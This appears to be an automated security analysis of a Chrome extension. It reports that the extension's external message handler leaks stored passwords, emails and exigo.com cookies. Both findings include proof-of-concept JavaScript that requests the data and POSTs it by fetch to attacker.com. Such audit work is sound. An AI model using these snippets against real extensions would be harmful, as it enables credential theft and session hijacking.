# CoCo Analysis: lkipohlhmnckldkanglmeinoalkmnigp

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (storage_sync_get_source, cookies_source)

---

## Sink 1: storage_sync_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lkipohlhmnckldkanglmeinoalkmnigp/opgen_generated_files/bg.js
Line 727 var storage_sync_get_source = {'key': 'value'};

**Code:**

```javascript
// Background script - External message handler (bg.js, line 965-1013)
function onRequest(request, sender, response) {
    switch (request.type) {
        case 'getPwd':
            chrome.storage.sync.get(request.values.key.toLowerCase(), (data) => {
                response(data); // <- attacker-controlled key, sensitive password data leaked
            });
            break;
        case 'email':
            chrome.storage.sync.get("email", (data) => {
                response(data); // <- email data leaked
            });
            break;
        // ... other cases
    }
}

// Line 1032 - External message listener
chrome.runtime.onMessageExternal.addListener(onRequest);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// Malicious extension or webpage (if listed in externally_connectable) can request stored passwords
chrome.runtime.sendMessage(
    "lkipohlhmnckldkanglmeinoalkmnigp", // target extension ID
    {
        type: "getPwd",
        values: { key: "somesite.exigo.com" }
    },
    function(response) {
        console.log("Stolen credentials:", response);
        // response contains {"ln": username, "pw": password, "date": ..., "uid": ..., "cn": ..., "env": ...}
        fetch("https://attacker.com/collect", {
            method: "POST",
            body: JSON.stringify(response)
        });
    }
);

// Or request email
chrome.runtime.sendMessage(
    "lkipohlhmnckldkanglmeinoalkmnigp",
    { type: "email", values: {} },
    function(response) {
        console.log("Stolen email:", response);
    }
);
```

**Impact:** Information disclosure - any external extension can retrieve stored passwords, usernames, emails, and other sensitive credentials from chrome.storage.sync by sending external messages to this extension.

---

## Sink 2: cookies_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lkipohlhmnckldkanglmeinoalkmnigp/opgen_generated_files/bg.js
Line 684-697 var cookie_source = {domain: '.uspto.gov', ...}

**Code:**

```javascript
// Background script - External message handler (bg.js, line 965-1013)
function onRequest(request, sender, response) {
    switch (request.type) {
        case 'getCookies':
            chrome.cookies.getAll({"domain":".exigo.com"}, cookies => {
                console.log(cookies);
                response(cookies); // <- all exigo.com cookies leaked to external caller
            });
            break;
        // ... other cases
    }
}

// Line 1032 - External message listener
chrome.runtime.onMessageExternal.addListener(onRequest);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// Malicious extension can request all exigo.com cookies
chrome.runtime.sendMessage(
    "lkipohlhmnckldkanglmeinoalkmnigp", // target extension ID
    {
        type: "getCookies",
        values: {}
    },
    function(response) {
        console.log("Stolen cookies:", response);
        // response contains all cookies for .exigo.com domain
        // Attacker can use these for session hijacking
        fetch("https://attacker.com/cookies", {
            method: "POST",
            body: JSON.stringify(response)
        });
    }
);
```

**Impact:** Information disclosure - any external extension can retrieve all cookies for the .exigo.com domain, enabling session hijacking and account takeover attacks.
